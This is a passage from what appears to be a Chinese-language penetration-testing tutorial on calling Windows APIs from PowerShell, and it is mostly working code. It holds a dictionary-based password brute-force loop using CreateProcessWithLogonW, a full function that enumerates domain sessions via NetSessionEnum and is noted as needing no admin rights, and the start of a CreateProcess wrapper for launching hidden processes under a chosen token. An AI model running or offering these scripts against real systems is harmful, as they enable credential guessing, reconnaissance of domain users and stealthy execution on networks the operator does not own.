    ​
        :UsernameLoop foreach ($username in $usernames)
        {
            foreach ($Password in $Passwords)
            {
                $CallResult = [Advapi32]::CreateProcessWithLogonW(
                    $User, $Domain, $Password, $LogonType, $Binary,
                    $Args, 0x04000000, $null, $GetCurrentPath,
                    [ref]$StartupInfo, [ref]$ProcessInfo)
    ​
                if (!$CallResult) {
                    echo "==> $((New-Object System.ComponentModel.Win32Exception([int][Kernel32]::GetLastError())).Message)"
                    echo "Test: " , $User , $password
                } else {
                    echo "`n[+] Success, process details:"
                    Get-Process -Id $ProcessInfo.dwProcessId
                    echo "Test: " , $User , $password
                    break UsernameLoop
                } 
            }
        }
    }
这是整个脚本的代码，那么下面就是运行的结果，我们只需要指定好他的字典文件即可
## NetSessionEnum
下面一个简单的介绍NetSessionEnum。首先我们需要了解的是，在真实的测试过程中我们需要知道域内的组织架构，域内的活动机器等等。那么可以提供的工具也有很多，比如：PVEFindADUser.exe
psloggedon.exe netsess.exe
hunter.exe等等，那么我们还是选择powershell作为我们的最佳利用工具，其实上面讲到的工具都是调用了NetSessionEnum
API，那么我们Powershell也能够非常方便的调用此API，而且最重要的一点，我们并不需要域管的权限，下面我们来看一下这里如何实现。
    function Invoke-NetSessionEnum {
     Invoke-NetSessionEnum -HostName SomeHostName
    ​
    #>
    ​
        param (
            [Parameter(Mandatory = $True)]
            [string]$HostName
        )  
    ​
        Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
    [StructLayout(LayoutKind.Sequential)]
     public struct SESSION_INFO_10
     {
     [MarshalAs(UnmanagedType.LPWStr)]public string OriginatingHost;
     [MarshalAs(UnmanagedType.LPWStr)]public string DomainUser;
     public uint SessionTime;
     public uint IdleTime;
     }
    public static class Netapi32
    {
    [DllImport("Netapi32.dll", SetLastError=true)]
    public static extern int NetSessionEnum(
    [In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
    [In,MarshalAs(UnmanagedType.LPWStr)] string UncClientName,
    [In,MarshalAs(UnmanagedType.LPWStr)] string UserName,
    Int32 Level,
    out IntPtr bufptr,
    int prefmaxlen,
    ref Int32 entriesread,
    ref Int32 totalentries,
    ref Int32 resume_handle);
    [DllImport("Netapi32.dll", SetLastError=true)]
    public static extern int NetApiBufferFree(
    IntPtr Buffer);
    }
    "@
    # 创建 SessionInfo10 结构
    $SessionInfo10 = New-Object SESSION_INFO_10
    $SessionInfo10StructSize = [System.Runtime.InteropServices.Marshal]::SizeOf($SessionInfo10) # Grab size to loop bufptr
    $SessionInfo10 = $SessionInfo10.GetType() 
    # NetSessionEnum 的参数
    $OutBuffPtr = [IntPtr]::Zero 
    $EntriesRead = $TotalEntries = $ResumeHandle = 0
    $CallResult = [Netapi32]::NetSessionEnum($HostName, "", "", 10, [ref]$OutBuffPtr, -1, [ref]$EntriesRead, [ref]$TotalEntries, [ref]$ResumeHandle)
    if ($CallResult -ne 0){
    echo "something wrong!`nError Code: $CallResult"
    }
    else {
    if ([System.IntPtr]::Size -eq 4) {
    echo "`nNetapi32::NetSessionEnum Buffer Offset --> 0x$("{0:X8}" -f $OutBuffPtr.ToInt32())"
    }
    else {
    echo "`nNetapi32::NetSessionEnum Buffer Offset --> 0x$("{0:X16}" -f $OutBuffPtr.ToInt64())"
    }
    echo "Result-set contains $EntriesRead session(s)!"
    # Change buffer offset to int
    $BufferOffset = $OutBuffPtr.ToInt64()
    # Loop buffer entries and cast pointers as SessionInfo10
    for ($Count = 0; ($Count -lt $EntriesRead); $Count++){
    $NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
    $Info = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr,[type]$SessionInfo10)
    $Info
    $BufferOffset = $BufferOffset + $SessionInfo10StructSize
    }
    echo "`nCalling NetApiBufferFree, no memleaks here!"
    [Netapi32]::NetApiBufferFree($OutBuffPtr) |Out-Null
    }
    }
## CreateProcess
最后我们在看一个我们用的最多的API例子：进程创建，我们需要远程创建一个没有窗口而去token由我们指定的进程，至于为什么要这么干大家可以自己领悟。那么CreateProcess
API就能满足我们的需求，我们来看一个简单的例子:
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    ​
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
     public IntPtr hProcess;
     public IntPtr hThread;
     public uint dwProcessId;
     public uint dwThreadId;
    }
    ​
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
     public uint cb;
     public string lpReserved;
     public string lpDesktop;
     public string lpTitle;
     public uint dwX;
     public uint dwY;
     public uint dwXSize;
     public uint dwYSize;
     public uint dwXCountChars;
     public uint dwYCountChars;
     public uint dwFillAttribute;
     public uint dwFlags;
     public short wShowWindow;
     public short cbReserved2;
     public IntPtr lpReserved2;
     public IntPtr hStdInput;
     public IntPtr hStdOutput;
     public IntPtr hStdError;
    }
    ​
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
     public int length;
     public IntPtr lpSecurityDescriptor;
     public bool bInheritHandle;
    }
    ​
    public static class Kernel32
    {
     [DllImport("kernel32.dll", SetLastError=true)]
     public static extern bool CreateProcess(
     string lpApplicationName,
     string lpCommandLine,
     ref SECURITY_ATTRIBUTES lpProcessAttributes, 
     ref SECURITY_ATTRIBUTES lpThreadAttributes,
     bool bInheritHandles,
     uint dwCreationFlags, 
     IntPtr lpEnvironment,
     string lpCurrentDirectory,
     ref STARTUPINFO lpStartupInfo, 
     out PROCESS_INFORMATION lpProcessInformation);
    }
    "@